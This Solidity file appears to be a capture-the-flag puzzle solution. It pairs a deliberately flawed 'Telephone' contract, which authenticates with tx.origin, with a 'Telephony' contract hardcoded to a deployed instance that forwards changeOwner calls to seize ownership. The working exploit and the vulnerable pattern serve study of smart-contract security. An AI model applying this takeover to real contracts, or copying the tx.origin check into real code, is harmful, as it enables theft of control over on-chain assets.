pragma solidity ^0.5.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Telephony {
    Telephone tele;
    
    constructor() public {
        tele = Telephone(0x45AE4D85e519AE65ac58F7610bca5251D4ec9450);
    }
    
    function changeOwner(address _owner) public {
        tele.changeOwner(_owner);
    }
}
